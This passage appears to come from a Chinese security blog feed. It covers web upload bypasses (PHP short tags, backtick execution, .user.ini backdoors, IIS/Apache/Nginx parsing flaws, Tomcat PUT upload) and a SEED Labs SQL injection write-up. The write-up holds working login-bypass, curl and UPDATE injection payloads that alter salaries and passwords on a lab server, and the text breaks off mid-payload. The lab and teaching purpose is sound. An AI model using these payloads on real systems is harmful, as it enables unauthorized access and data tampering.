class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$search</span>,<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replace</span>,<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span>,<span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> = ?)<br></code></pre></td></tr></table></figure><p>功能：用于对数组中的元素或字符串中的子串进行替换，替换从左到右进行，该函数替换不区分字母大小写（另外一个函数<code>str_replace</code>区分大小写）.第一个参数<code>$search</code>为需要替换的内容（子串或数组），第二个参数<code>$replace</code>为替换成的内容（字符串或数组），第三个参数<code>$subject</code>为被替换的字符串.</p><p><strong>strstr():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$before_needle</span> = <span class="hljs-literal">false</span>)<br></code></pre></td></tr></table></figure><p>功能：查找字符串<code>$needle</code>在<code>$haystack</code>中首次出现的位置，并将<code>$needle</code>及其之后的字符串返回.</p><p><strong>substr():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$string</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$offset</span>, ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$length</span> = <span class="hljs-literal">null</span>)<br></code></pre></td></tr></table></figure><p>功能：返回字符串<code>$string</code>中的子串.<code>$offset</code>指定子串首个字符在<code>$string</code>中的下标位置，<code>$length</code>指定截取的子串长度.</p><p><strong>trim():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$str</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$character_mask</span> = <span class="hljs-string">&quot;(空格)\t\n\r\0\x0B&quot;</span>)<br></code></pre></td></tr></table></figure><p>功能：去除字符串<code>$str</code>的首尾的空白字符.第二个参数保持默认时，去除的字符为上述字符.</p><h2 id="其他绕过方法">2.4 其他绕过方法</h2><h3 id="php短标签">2.4.1 php短标签</h3><p>我们最常见的 PHP 标签是<code>&lt;?php ?&gt;</code>，但是 PHP中还有两种短标签，即<code>&lt;? ?&gt;</code>和<code>&lt;?= ?&gt;</code>.当关键字"php"被过滤了之后，此时我们便不能使用<code>&lt;?php ?&gt;</code>了，但是我们可以用另外两种短标签进行绕过，并且在短标签中的代码不需要使用分号<code>;</code>.其中，<code>&lt;? ?&gt;</code>相当于对<code>&lt;?php ?&gt;</code>的替换，而<code>&lt;?=(表达式) ?&gt;</code>则是相当于<code>&lt;?php echo (表达式) ?&gt;</code>.支持版本：PHP5.4+</p><h3 id="php反引号">2.4.2 php反引号</h3><p>PHP中，反引号可以直接命令执行系统命令，但是如果想要输出执行结果还需要使用echo 等函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `ls /`;<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"># 使用&lt;?= ?&gt;短标签（比较灵活）</span><br><span class="hljs-meta">&lt;?=</span> `ls /`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="上传-.user.ini">2.4.3 上传 .user.ini</h3><ul><li><p>php.ini 是 php 的一个全局配置文件，对整个 web服务起作用；而.user.ini 和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门.</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_prepend_file=&lt;filename&gt;<span class="hljs-comment">//包含在文件头</span><br><span class="hljs-built_in">auto</span>_append_file=&lt;filename&gt;<span class="hljs-comment">//包含在文件尾</span><br></code></pre></td></tr></table></figure></li><li><p>局限性：在.user.ini 中使用这条配置是在同目录下的其他.php文件中包含配置中所指定的文件，也就是说需要该目录下存在.php文件.通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php文件.</p></li></ul><h1 id="web容器及iis">3. Web容器及IIS</h1><h2 id="常见web容器">3.1 常见Web容器</h2><ul><li>服务器:一种管理资源并为用户提供服务的计算机。Web服务器，即www服务器或http服务器。提供Web信息浏览服务。它只需支HTTP协议、HTML文档格式及URL。向浏览器提供服务的程序。</li><li>中间件:提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。Web中间件就是提供Web应用软件和系统软件连接的一个软件的总称。</li><li>容器:是中间件的一种，作为操作系统和应用程序之间的桥梁，给处于其中的应用程序组件(JSP，PHP，ASP）提供一个环境。使处于其中的应用程序组件直接跟容器中的环境变量接口交互，不必关注其它系统问题。</li><li>三者之间很多是包含关系，Web服务器&gt;Web中间件&gt;Web容器。</li><li>web容器是一种<strong>服务程序</strong>，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如JAVA中的Tomcat容器，ASP的IIS都是这样的容器。一个服务器可以有多个容器。我们在常见web容器漏洞这部分学习中需要使用的容器如下:IIS、Apache、Nginx、Tomcat、Jboss、WebLogic。</li></ul><h2 id="iis简介">3.2 IIS简介</h2><ul><li>IIS的全称是互联网信息服务（Internet lnformationServices），是由微软公司提供的基于运行MicrosoftWindows的互联网基本服务。IIS包括FTP/FTPS、NNTP、HTTPS/HTTP、SMTP等服务。</li><li>一般用ASP.Net开发软件，然后靠lIS对公网提供服务，软件的底层是.netFramework</li><li>文件解析：<ul><li>当服务器接收到一个Http请求的时候，IIS首先需要决定如何去处理这个请求（服务器处理一个.htm页面和一个.aspx页面肯定是不一样)。那IIS依据什么去处理呢?根据文件的后缀名</li><li>服务器获取所请求的页面（也可以是文件，比如1.jpg）的后缀名以后，接下来会在服务器端寻找可以处理这类后缀名的应用程序，如果IIS找不到可以处理此类文件的应用程序，那么IIS将直接把这个文件返还给客户端。</li></ul></li></ul><h2 id="iis文件解析漏洞">3.3 IIS文件解析漏洞</h2><ul><li>文件解析漏洞一般用于各种上传漏洞中，在文件上传的地方一般会限制用户可以上传文件的后缀名，比如php的网站如果可以上传php文件，那么就可以上传一个php木马，然后控制该服务器了，也就是我们所说的getshell了。</li><li>实际的漏洞环境中IIS一般是和asp搭配的，上传的地方如果限制了.asp的后缀名，那么首先想到的应该是使用其它lIS支持的文件后缀。其实lIS解析asp脚本除了<strong>.asp</strong>后缀，还有<strong>.cer</strong>和<strong>.asa</strong>。</li><li>如果网站将.asp、.cer、.asa这样的可以被服务端解析的后缀名全部过滤了的话，就只能通过其它的一些方法绕过了。就比如文件解析漏洞。</li><li><strong>IIS6.0</strong>在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。这—漏洞有两种完全不同的利用方式:<ul><li>特殊符号“/”，任意文件夹名.asp目录下的任何文件都会被IIS当作asp脚本执行</li><li>特殊符号“;”，任意文件名.asp;.jpg，虽然真正后缀是.jpg，但是IIS6.0的特殊符号“;”会将该文件当作asp脚本执行</li><li><strong>修复方法：</strong>升级IIS版本，IIS5.1与7.5均无此漏洞。</li></ul></li><li><strong>IIS7.5</strong>解析漏洞：<code>文件/任意文件名.php</code>，从而解析脚本文件。实例：<code>http://ip/upload/6720210701210811.png/.php</code></li></ul><h1 id="apache文件解析漏洞">4. Apache文件解析漏洞</h1><p><strong>Apache和php三种结合方法:</strong></p><ul><li>CGl:通常翻译为共同网关接口，是HTTP服务器与机器上的其他程序进行通信的一个接口，让Web服务器必要时启动额外的程序处理动态内容。</li><li>FastCGl:CGl解释器的更快实现，可以提供良好的性能、伸缩性、Fail-Over特性等等。</li><li>Module:把php编译为apache的模块，也是用的最多的一种方法。(Apache解析漏洞)</li></ul><p><strong>Apache解析文件的方法:</strong></p><p>一个重要文件<code>/etc/mime.types</code>：这里记录了大量的文件后缀和mime类型,当客户端请求一个文件时,如果后缀在这个列表里,那么apache就返回对应的content-type给浏览器.如果不在列表,apache不会返回Content-type给浏览器,而直接返回文件内容,由浏览器自动处理。</p><p><strong>漏洞原理：</strong></p><p>Apache文件解析漏洞涉及到一个解析文件的特性:</p><ul><li>Apache默认一个文件可以有多个以点分隔的后缀,当右边的后缀无法识别(不在mime.types内),则继续向左识别。</li><li>当我们请求这样一个文件:shell.php.xxx.yyy<ul><li>yyy -&gt;无法识别,向左</li><li>xxx -&gt; 无法识别,向左</li><li>php -&gt;发现后缀是php，交给php处理这个文件</li></ul></li><li>最后一步虽然交给了php来处理这个文件，但是php也不认识.aaa的后缀，所以只会直接输出。</li><li>漏洞根源：由于运维人员在配置服务器时，为了使apache服务器能解析php，而自己添加一个handler，例如:<code>AddHandler application/x-httpd-php .php</code>。它的作用也是为了让apache把php文件交给php_module解析,但是注意到它的后缀不是用正则去匹配的。所以,在文件名的任何位置匹配到php后缀,它都会让php_module解析。</li></ul><p><strong>修复方法：</strong></p><ul><li>不要使用AddHandler,改用SetHandler,写好正则。</li><li>禁止.php.这样的文件执行。</li></ul><p>注：/var/www/html是Apache的默认Web根目录</p><h1 id="nginx文件解析漏洞">5. Nginx文件解析漏洞</h1><h2 id="nginx配置">5.1 Nginx配置</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">相关目录<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<span class="hljs-comment">#默认web目录</span><br><span class="hljs-regexp">/etc/</span>nginx/<span class="hljs-comment">#配置文件目录</span><br><span class="hljs-regexp">/etc/</span>php5/fpm<span class="hljs-comment">#php配置文件目录</span><br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log <span class="hljs-comment">#访问日志</span><br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>error.log <span class="hljs-comment">#错误日志</span><br></code></pre></td></tr></table></figure><h2 id="漏洞">5.2 漏洞</h2><p><strong>原理：</strong></p><ul><li>对任意文件名，在后面添加<code>/任意文件名.php</code>的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。</li><li>对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</li><li>和Apache一样，Nginx也是通过mime.types识别文件。文件在<code>/etc/nginx/mime.types</code>。</li></ul><p><strong>修复方法：</strong></p><ul><li>将php.ini文件中的cgi.fix_pathinfo（默认为1）的值设为0。这样php在解析1.jpg/1.php这样的目录时，只要1.php不存在就会显示404。</li><li>将/etc/php5/fpm/pool.d/www.conf中security.limitextensions后面的值记为.php。</li></ul><h1 id="tomcat任意文件上传">6. Tomcat任意文件上传</h1><ul><li>Tomcat 远程代码执行漏洞，编号:CVE-2017-12615</li><li>Tomcat配置文件web.xml中，Servlet配置readonly=fasle时，会引发任意文件上传漏洞。</li><li><strong>readonly参数默认是true</strong>，即不允许delete和put操作，所以通过XMLHttpRequest对象的put或者delete方法访问就会报告http403错误。但很多时候为了支持REST服务，会设置该属性为false。将 readonly参数设置为 false 时，即可通过 PUT方式创建一个JSP文件，并可以执行任意代码。</li><li>影响版本：Tomcat 7.0.0-7.0.81</li><li>Tomcat默认端口：8080</li></ul><h1 id="上传漏洞防御">7. 上传漏洞防御</h1><h2 id="防御原则">7.1 防御原则</h2><p><strong>核心思想：</strong>确保上传的文件不会被服务器解析成可执行的脚本，进而引发偏离功能设计的意外后果。</p><ul><li>限制文件上传类型：</li><li>在文件类型检查时，通常采用白名单限制安全的文件类型，因为黑名单常常会出现遗漏或者大小写绕过等问题。</li><li>使用随机数改写文件名和文件路径，杜绝上传时的文件名攻击。</li><li>对于图片的处理,可以考虑对其进行二次渲染/压缩（使用压缩函数或者resize函数），在处理图片的同时破环图片中可能包含的代码。</li><li>文件上传的目录设置为不可执行。只要Web容器无法解析该目录下的文件，即使上传了脚本文件，服务器本身也不会受到影响。</li><li>限制上传文件大小：<ul><li>限制上传文件的大小，防止由于内存、磁盘耗尽造成的拒绝服务</li><li>可以配置web server允许的最大Post大小</li><li>可以在代码层面获取上文件的大小，根据文件类型的不同进行进一步的过滤</li></ul></li><li>其他：<ul><li>确保上传的文件放在安全的路径下，必要时可将上传的文件存放于webserver之外的远程服务器。</li><li>确保web_server版本为最新，防止由于web_server漏洞造成的文件意外解析。</li><li>部分文件上传攻击会配合本地其他漏洞进行，所以也要保证web服务器减少其他可利用漏洞。</li></ul></li></ul><p>参考教程：</p><ol type="1"><li><a href="https://zhuanlan.zhihu.com/p/138200793">PHP之一句话木马 -知乎 (zhihu.com)</a></li><li><ahref="https://www.freebuf.com/articles/network/279563.html">老生常谈的无字母数字Webshell 总结 - FreeBuf网络安全行业门户</a></li><li><ahref="https://www.cnblogs.com/-zhong/p/10969749.html">php的intval函数 -yourse1f - 博客园 (cnblogs.com)</a></li><li><ahref="https://blog.csdn.net/qq_35630119/article/details/122642068">文件上传利用的常见函数_文件上传函数_wingaso的博客-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL Injection Attack</title>
    <link href="/2023/11/07/SEED-LABS/Web%20Security/SQL%20Injection%20Attack/"/>
    <url>/2023/11/07/SEED-LABS/Web%20Security/SQL%20Injection%20Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1. Overview</h1><p>SQL注入是一种代码注入技术，它利用web应用程序和数据库服务器之间接口中的漏洞。当用户的输入在发送到后端数据库服务器之前未在web应用程序中正确检查时，就会出现此漏洞。</p><p>许多web应用程序从用户处获取输入，然后使用这些输入构造SQL查询，这样web应用程序就可以从数据库中获取信息。Web应用程序还使用SQL查询在数据库中存储信息。这些是web应用程序开发中的常见做法。如果未仔细构造SQL查询，则可能会出现SQL注入漏洞。SQL注入攻击是对web应用程序最常见的攻击之一。</p><p>在本实验室中，我们创建了一个易受SQL注入攻击的web应用程序。我们的web应用程序包含许多web开发人员所犯的常见错误。学生的目标是找到利用SQL注入漏洞的方法，演示攻击可能造成的损害，并掌握有助于抵御此类攻击的技术。本实验室涵盖以下主题：</p><ul><li>SQL 语句：SELECT 和 UPDATE 语句</li><li>SQL 注入</li><li>准备语句</li></ul><h1 id="lab-environment">2. Lab Environment</h1><p>我们为本实验室开发了一个网络应用程序，并使用容器来设置该网络应用程序。实验室设置中有两个容器，一个用于托管网络应用程序，另一个用于托管网络应用程序的数据库。网络应用程序容器的IP 地址是 10.9.0.5，网络应用程序的 URL 如下：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514684.png"alt="image-20231211144330850" /><figcaption aria-hidden="true">image-20231211144330850</figcaption></figure><p>我们需要将此主机名映射到容器的 IP 地址。请在 /etc/hosts文件中添加以下条目。您需要使用 root 权限来更改此文件（使用sudo）。需要注意的是，这个名称可能已经因为其他实验室的原因被添加到文件中。如果映射到不同的IP 地址，则必须删除旧条目。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514685.png"alt="image-20231211144357379" /><figcaption aria-hidden="true">image-20231211144357379</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810535.png"alt="image-20231107170405811" /><figcaption aria-hidden="true">image-20231107170405811</figcaption></figure><h2 id="container-setup-and-commands">2.1 Container Setup andCommands</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dcbuild <span class="hljs-comment"># Alias for: docker-compose build</span><br>$ dcup <span class="hljs-comment"># Alias for: docker-compose up</span><br>$ dcdown <span class="hljs-comment"># Alias for: docker-compose down</span><br><br>$ dockps // Alias <span class="hljs-keyword">for</span>: docker ps --format <span class="hljs-string">&quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span><br>$ docksh &lt;<span class="hljs-built_in">id</span>&gt; // Alias <span class="hljs-keyword">for</span>: docker <span class="hljs-built_in">exec</span> -it &lt;<span class="hljs-built_in">id</span>&gt; /bin/bash<br></code></pre></td></tr></table></figure><p><strong>MySQL数据库</strong>：容器通常是一次性的，因此一旦被销毁，容器内的所有数据都会丢失。在本实验室中，我们确实希望保留MySQL数据库中的数据，这样在关闭容器时就不会丢失我们的工作。为此，我们将主机上的mysql 数据文件夹（在 Labsetup 中，它将在 MySQL容器运行一次后创建）挂载到 MySQL 容器内的 /var/lib/mysql文件夹。该文件夹是 MySQL存储数据库的地方。因此，即使容器被破坏，数据库中的数据仍会保留。如果确实想从一个干净的数据库开始，可以删除此文件夹：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514686.png"alt="image-20231211144536327" /><figcaption aria-hidden="true">image-20231211144536327</figcaption></figure><h2 id="about-the-web-application">2.2 About the Web Application</h2><p>我们创建了一个网络应用程序，这是一个简单的员工管理应用程序。员工可以通过这个网络应用程序查看和更新数据库中的个人信息。在这个网络应用程序中主要有两个角色：管理员是特权角色，可以管理每个员工的个人资料信息；员工是普通角色，可以查看或更新自己的个人资料信息。所有员工信息如表1 所示。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514687.png"alt="image-20231211144609062" /><figcaption aria-hidden="true">image-20231211144609062</figcaption></figure><h1 id="lab-tasks">3. Lab Tasks</h1><h2 id="task-1-get-familiar-with-sql-statements">3.1 Task 1: GetFamiliar with SQL Statements</h2><p>本任务的目的是通过使用所提供的数据库来熟悉 SQL命令。我们的网络应用程序使用的数据存储在 MySQL数据库中，该数据库托管在我们的 MySQL 容器上。 我们创建了一个名为 sqllabusers 的数据库，其中包含一个名为 credential的表。该表存储了每位员工的个人信息（如eid、密码、工资、社保号等）。在本任务中，您需要使用数据库来熟悉 SQL查询。</p><p>请在 MySQL 容器上获取一个shell（有关说明，请参阅容器手册；手册链接到实验室网站）。然后使用 mysql客户端程序与数据库交互。用户名为 root，密码为 dees。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514689.png"alt="image-20231211144748267" /><figcaption aria-hidden="true">image-20231211144748267</figcaption></figure><p>登录后，您可以创建新数据库或加载现有数据库。由于我们已经为您创建了sqllab 用户数据库，您只需使用 use 命令加载现有数据库即可。要显示 sqllab用户数据库中有哪些表，可以使用 show tables命令打印出所选数据库中的所有表。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514690.png"alt="image-20231211144807806" /><figcaption aria-hidden="true">image-20231211144807806</figcaption></figure><p>运行上述命令后，您需要使用 SQL 命令打印雇员 Alice的所有档案信息。请提供结果截图。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p><code>dockps</code>查看正在运行的容器，找到mysql容器的ID；</p></li><li><p><code>docksh ID</code>进入容器的shell；</p></li><li><p><code>mysql -u root -pdees</code>登录进入mysql交互界面；</p></li><li><p><code>show databases;</code>查看数据库；</p></li><li><p><code>use sqllab_users;</code>选择进入已创建的数据库；</p></li><li><p><code>show tables;</code>查看表；</p></li><li><p><code>select * from credential where Name='Alice';</code>打印Alice的所有信息</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514691.png"alt="image-20231211144910503" /><figcaption aria-hidden="true">image-20231211144910503</figcaption></figure></li></ol><h2 id="task-2-sql-injection-attack-on-select-statement">3.2 Task 2: SQLInjection Attack on SELECT Statement</h2><p>SQL 注入基本上是一种技术，攻击者可以通过它执行自己的恶意 SQL语句，一般称为恶意有效载荷。通过恶意 SQL语句，攻击者可以从受害者数据库中窃取信息；更有甚者，他们还可能对数据库进行更改。我们的员工管理网络应用程序存在SQL 注入漏洞，这些漏洞模仿了开发人员经常犯的错误。</p><p>我们将使用 www.seed-server.com中的登录页面来完成这项任务。登录页面如图 1所示。它要求用户提供用户名和密码。网络应用程序根据这两个数据对用户进行身份验证，因此只有知道密码的员工才能登录。作为攻击者，你的任务就是在不知道任何员工凭证的情况下登录网络应用程序。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514692.png"alt="image-20231211145039960" /><figcaption aria-hidden="true">image-20231211145039960</figcaption></figure><p>为了帮助您开始这项任务，我们将解释如何在网络应用程序中实施身份验证。位于 /var/www/SQL_Injection 目录中的不安全 home.php PHP代码用于进行用户身份验证。下面的代码片段展示了如何对用户进行身份验证。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514693.png"alt="image-20231211145106237" /><figcaption aria-hidden="true">image-20231211145106237</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514694.png"alt="image-20231211145112539" /><figcaption aria-hidden="true">image-20231211145112539</figcaption></figure><p>上述 SQL 语句从凭证表中选择员工个人信息，如ID、姓名、工资、社保号等。SQL 语句使用两个变量 input uname 和 hashedpwd，其中 input uname 保存用户在登录页面的用户名字段中输入的字符串，而hashed pwd 保存用户输入的密码的 sha1哈希值。程序会检查是否有记录与所提供的用户名和密码匹配；如果匹配，则用户身份验证成功，并获得相应的员工信息。如果不匹配，则验证失败。</p><h3 id="task-2.1-sql-injection-attack-from-webpage">3.2.1 Task 2.1: SQLInjection Attack from webpage</h3><p>您的任务是以管理员身份从登录页面登录网络应用程序，以便查看所有员工的信息。我们假设您知道管理员的账户名是admin，但不知道密码。您需要决定在用户名和密码字段中输入什么内容才能成功攻击。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>注入语句：username:<code>admin’--(空格)</code>或<code>admin’#</code>；password:任意值，可为空。</p></li><li><p>注入原理：字符型注入，通过单引号进行闭合.<code>--(空格)</code>和<code>#</code>在SQL查询语句中都表示注释，因此后面的SQL语句不会执行.根据伪代码，用户名为admin，查询得到全部用户信息.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514695.png"alt="image-20231211145253840" /><figcaption aria-hidden="true">image-20231211145253840</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514696.png"alt="image-20231211145306602" /><figcaption aria-hidden="true">image-20231211145306602</figcaption></figure></li></ol><h3 id="task-2.2-sql-injection-attack-from-command-line.">3.2.2 Task2.2: SQL Injection Attack from command line.</h3><p>您的任务是重复任务2.1，但需要在不使用网页的情况下完成。你可以使用命令行工具，例如可以发送HTTP 请求的 curl。值得一提的是，如果你想在 HTTP请求中包含多个参数，就需要将 URL和参数放在一对单引号之间；否则，用于分隔参数的特殊字符（如 &amp;）会被shell程序解释，从而改变命令的含义。下面的示例展示了如何向网络应用程序发送HTTP GET 请求，并附加两个参数（用户名和密码）：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514697.png"alt="image-20231211145340087" /><figcaption aria-hidden="true">image-20231211145340087</figcaption></figure><p>如果需要在用户名或密码字段中包含特殊字符，则需要正确编码，否则会改变请求的含义。如果要在这些字段中包含单引号，应使用%27 代替；如果要包含空白，应使用 %20。在本任务中，你确实需要在使用 curl发送请求时处理 HTTP 编码。</p><p><strong>实验流程：</strong></p><ol type="1"><li>注入原理：同task2.1相同，只需要对特殊字符进行URL编码即可。%27是单引号的url编码，%20是空格的url编码，%23是#的url编码。</li><li>注入命令1（使用--进行注释）：<code>curl 'www.seed-server.com/unsafe_home.php?username=admin%27--%20&amp;Password='</code>；注入命令2（使用#进行注释）：<code>curl 'www.seed-server.com/unsafe_home.php?username=admin%27%23&amp;Password='</code>。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810540.png"alt="image-20231107171906043" /><figcaption aria-hidden="true">image-20231107171906043</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810541.png"alt="image-20231107171913097" /><figcaption aria-hidden="true">image-20231107171913097</figcaption></figure><h3 id="task-2.3append-a-new-sql-statement">3.2.3 Task 2.3:Append a newSQL statement</h3><p>在上述两种攻击中，我们只能窃取数据库中的信息；如果我们能利用登录页面中的相同漏洞修改数据库，效果会更好。一种方法是使用 SQL 注入攻击，将一条 SQL语句变成两条，第二条是更新或删除语句。在 SQL 中，分号（;）用于分隔两条SQL 语句。请尝试通过登录页面运行两条 SQL 语句。</p><p>在这次攻击中，有一种对策可以阻止你运行两条 SQL 语句。请使用 SEED书籍或互联网资源找出这个对策，并在实验报告中描述你的发现。</p><p><strong>实验流程：</strong></p><ol type="1"><li>注入语句：username：<code>admin';UPDATE credential  SET Salary = '66666' WHERE Name='Alice';#</code>；password：任意值。</li><li>执行效果：注入失败，返回报错信息。</li><li>原因分析：使用mysqli对象中的query()方法每次调用只能执行一条SQL命令。如果需要一次执行多条SQL命令，就必须使用mysqli对象中的multi_query()方法。具体做法是把多条SQL命令写在同一个字符串里作为参数传递给multi_query()方法，多条SQL之间使用分号（;）分隔。通过代码审计，发现后端使用了query()方法，因此执行多条SQL语句会报错。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514698.png"alt="image-20231211150008947" /><figcaption aria-hidden="true">image-20231211150008947</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514699.png"alt="image-20231211150020434" /><figcaption aria-hidden="true">image-20231211150020434</figcaption></figure><h2 id="task-3-sql-injection-attack-on-update-statement">3.3 Task 3: SQLInjection Attack on UPDATE Statement</h2><p>如果在 UPDATE 语句中出现 SQL注入漏洞，危害将更加严重，因为攻击者可以利用该漏洞修改数据库。在我们的"员工管理 "应用程序中，有一个 "编辑个人资料 "页面（图2）允许员工更新个人资料信息，包括昵称、电子邮件、地址、电话号码和密码。要进入该页面，员工需要先登录。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514700.png"alt="image-20231211150126409" /><figcaption aria-hidden="true">image-20231211150126409</figcaption></figure><p>当员工通过编辑个人资料页面更新信息时，将执行以下 SQL UPDATE查询。在不安全的 edit backend.php 文件中执行的 PHP代码用于更新员工的个人资料信息。该 PHP 文件位于 /var/www/SQLInjection目录中。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514701.png"alt="image-20231211150135082" /><figcaption aria-hidden="true">image-20231211150135082</figcaption></figure><h3 id="task-3.1-modify-your-own-salary">3.3.1 Task 3.1: Modify your ownsalary</h3><p>如编辑个人资料页面所示，员工只能更新自己的昵称、电子邮件、地址、电话号码和密码，无权更改工资。假设您（Alice）是一名心怀不满的员工，而您的老板Boby 今年没有给您涨工资。你想利用编辑-档案页面中的 SQL注入漏洞来增加自己的工资。请演示如何实现这一目标。我们假设你知道工资存储在名为salary 的列中。</p><p><strong>实验流程：</strong></p><ol type="1"><li>注入语句：<code>1',Salary='666666</code>.</li><li>注入原理：利用SQL语句对用户输入直接进行拼接的漏洞，添加了一个字段和对应值.成功修改个人工资.</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810544.png"alt="image-20231107172301359" /><figcaption aria-hidden="true">image-20231107172301359</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810545.png"alt="image-20231107172315590" /><figcaption aria-hidden="true">image-20231107172315590</figcaption></figure><h3 id="task-3.2modify-other-people-salary">3.3.2 Task 3.2:Modify otherpeople’ salary</h3><p>在增加了自己的工资后，您决定惩罚您的老板 Boby。你想把他的工资降到 1美元。请演示如何实现这一目标。</p><p><strong>实验流程：</strong></p><ol type="1"><li>注入语句：<code>',salary='1' where name='Boby'#</code>.</li><li>注入原理：SQL更新语句是根据where后面的值进行查找更新，可以将name值设置为Boby，即可修改Boby信息.查看所有人信息，成功修改Boby工资.</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810546.png"alt="image-20231107172506189" /><figcaption aria-hidden="true">image-20231107172506189</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810547.png"alt="image-20231107172511134" /><figcaption aria-hidden="true">image-20231107172511134</figcaption></figure><h3 id="task-3.3modify-other-people-password">3.3.3 Task 3.3:Modifyother people’ password</h3><p>在修改了 Boby 的工资后，你仍然心怀不满，因此你想把 Boby的密码改成你知道的密码，然后你就可以登录他的账户，进一步进行破坏。请演示你是如何做到这一点的。你需要证明你可以使用新密码成功登录Boby的账户。这里值得一提的是，数据库存储的是密码的哈希值，而不是明文密码字符串。你可以再次查看不安全的编辑backend.php 代码，了解密码是如何存储的。它使用 SHA1散列函数生成密码的散列值。</p><p><strong>实验流程：</strong></p><ol type="1"><li>注入语句：<code>',password='修改密码SHA1值' where 